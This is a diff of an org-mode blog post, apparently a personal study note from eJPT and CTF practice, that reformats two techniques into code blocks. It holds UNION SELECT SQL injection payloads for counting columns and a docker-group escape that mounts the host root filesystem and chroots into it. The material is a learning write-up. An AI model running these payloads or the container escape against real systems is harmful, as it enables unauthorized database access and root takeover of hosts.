@@ -4,7 +4,7 @@
 #+OPTIONS: num:nil toc:nil
 #+BEGIN_EXPORT html
 ---
-title:  SQL Injection,
+title:  SQL Injection...
 categories:
   - blog
 tags:
@@ -20,15 +20,17 @@ So I spend some time on INE eJPT path, to really get into the basics again.... a
 
 I quess this is a Enumeration methoth anyone can remember :)
 
-~' UNION SELECT NULL--~ \\
-~' UNION SELECT NULL,NULL--~ \\
-~' UNION SELECT NULL,NULL,NULL--~ \\
+#+begin_src sql :results output
+'' UNION SELECT NULL--
+'' UNION SELECT NULL,NULL--
+'' UNION SELECT NULL,NULL,NULL--
 
 
-~' UNION SELECT 'a',NULL,NULL,NULL--~ \\
-~' UNION SELECT NULL,'a',NULL,NULL--~ \\
-~' UNION SELECT NULL,NULL,'a',NULL--~ \\
-~' UNION SELECT NULL,NULL,NULL,'a'--~ \\
+'' UNION SELECT 'a',NULL,NULL,NULL--
+'' UNION SELECT NULL,'a',NULL,NULL--
+'' UNION SELECT NULL,NULL,'a',NULL--
+'' UNION SELECT NULL,NULL,NULL,'a'--
+#+end_src
 
 More info can be found here:
 https://portswigger.net/web-security/sql-injection/union-attacks
@@ -41,14 +43,18 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/dock
 
 Basically if you are in the docker group, you can do the following:
 
-~#Search the socket~ \\
-~find / -name docker.sock 2>/dev/null~ \\
-~#It's usually in /run/docker.sock~ \\
+#+begin_src sh :results output
+#Search the socket
+find / -name docker.sock 2>/dev/null
+#It's usually in /run/docker.sock
+#+end_src
 
 If found, than generate a new image, and mount the host filesystem into you image and chroot into it... thats a pretty nice.
 Although not that realistic I guess, but good for CTFs
 
-~#List images to use one~ \\
-~docker images~ \\
-~#Run the image mounting the host disk and chroot on it~ \\
-~docker run -it -v /:/host/ ubuntu:18.04 chroot /host~ \\
+#+begin_src sh :results output
+#List images to use one
+docker images
+#Run the image mounting the host disk and chroot on it
+docker run -it -v /:/host/ ubuntu:18.04 chroot /host
+#+end_src
